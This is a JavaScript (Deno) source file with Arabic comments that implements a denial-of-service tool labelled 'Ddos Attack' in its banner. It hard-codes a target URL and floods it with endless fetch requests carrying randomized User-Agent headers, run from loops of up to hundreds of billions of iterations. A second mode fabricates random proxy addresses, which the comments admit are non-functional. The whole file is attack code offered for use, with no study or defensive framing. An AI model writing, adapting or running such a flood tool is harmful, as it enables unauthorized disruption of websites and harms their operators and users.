// استيراد الحزم من esm.sh بدلاً من require
import figlet from 'https://esm.sh/figlet';
import UserAgents from 'https://esm.sh/user-agents';
// لا يمكن استخدام HttpsProxyAgent في Deno مباشرة — سيتم الاحتفاظ بالسطر كما هو (لكنه لن يعمل فعليًا)

// ألوان
const F = '\x1b[1;32m';
const Z = '\x1b[1;31m';
const S = '\x1b[1;33m';
const B = '\x1b[38;5;208m';

// إشعار الجاهزية
console.log(`${F}[✓] All libraries installed and ready to use!${Z}`);

// figlet مع تعديل بسيط لأن textSync غير مدعوم في Deno Deploy
let logo = '';
await new Promise((resolve, reject) => {
  figlet.text('Ddos Attack', { font: 'Slant' }, function (err, data) {
    if (err) {
      console.log('Something went wrong...');
      console.dir(err);
      reject(err);
    } else {
      logo = data;
      console.log(logo);
      resolve(true);
    }
  });
});

// الدالة الأساسية
function linked() {
  const sg = '2';
  if (sg === '1') {
    for (let i = 0; i < 50000; i++) {
      AttackMahos();
    }
  } else if (sg === '2') {
    for (let i = 0; i < 500000000000; i++) {
      ProxyAttack();
    }
  }
}

// target
const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';

// الهجوم الرئيسي بدون بروكسي
async function AttackMahos() {
  const userAgents = new UserAgents();
  while (true) {
    const headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': userAgents.random().toString()
    };
    try {
      const req = await fetch(url, { headers });
      if (req.status === 200) {
        console.log(`${F}GOOD Attack: ${url}`);
      } else {
        console.log(`${Z}BAD Attack: ${url}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url}`);
    }
  }
}

// هجوم مع بروكسي — احتفظنا بالسطر كما هو (لكن proxy agent غير مدعوم في Deno)
async function ProxyAttack() {
  const userAgents = new UserAgents();
  while (true) {
    const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
    const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
    const port = pl[Math.floor(Math.random() * pl.length)];
    const proxy = `${ip}:${port}`;
    const headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': userAgents.random().toString()
    };
    try {
      // NOTE: Proxy usage with fetch is not supported in Deno
      const req = await fetch(url, { headers /*, agent: new HttpsProxyAgent(`http://${proxy}`)*/ });
      if (req.status === 200) {
        console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
      } else {
        console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url} |`);
    }
  }
}

// بدء التنفيذ
linked();
